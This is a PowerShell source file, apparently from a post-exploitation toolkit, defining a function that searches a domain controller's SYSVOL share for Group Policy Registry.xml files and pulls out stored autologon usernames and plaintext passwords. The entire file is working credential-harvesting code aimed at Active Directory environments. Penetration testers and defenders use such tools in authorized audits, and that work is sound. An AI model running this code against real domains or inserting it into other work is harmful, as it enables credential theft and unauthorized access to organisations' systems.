function Get-GPPAutologon 
{

    
    [CmdletBinding()]
    Param ()
    
    
    Set-StrictMode -Version 2
    
    
    function Get-GPPInnerFields 
    {
    [CmdletBinding()]
        Param (
            $File 
        )
    
        try 
        {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            
            $Password = @()
            $UserName = @()
            
            
            if (($Xml.innerxml -like "*DefaultPassword*") -and ($Xml.innerxml -like "*DefaultUserName*"))
            {
                $props = $xml.GetElementsByTagName("Properties")
                foreach($prop in $props)
                {
                    switch ($prop.name) 
                    {
                        'DefaultPassword'
                        {
                            $Password += , $prop | Select-Object -ExpandProperty Value
                        }
                    
                        'DefaultUsername'
                        {
                            $Username += , $prop | Select-Object -ExpandProperty Value
                        }
                }

                    Write-Verbose "Potential password in $File"
                }
                         
                
                if (!($Password)) 
                {
                    $Password = '[BLANK]'
                }

                if (!($UserName))
                {
                    $UserName = '[BLANK]'
                }
                       
                
                $ObjectProperties = @{'Passwords' = $Password;
                                      'UserNames' = $UserName;
                                      'File' = $File}
                    
                $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                Write-Verbose "The password is between {} and may be more than one value."
                if ($ResultsObject)
                {
                    Return $ResultsObject
                } 
            }
        }
        catch {Write-Error $Error[0]}
    }

    try {
        
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }
    
        
        Write-Verbose 'Searching the DC. This could take a while.'
        $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Registry.xml'
    
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
        foreach ($File in $XMLFiles) {
                $Result = (Get-GppInnerFields $File.Fullname)
                Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}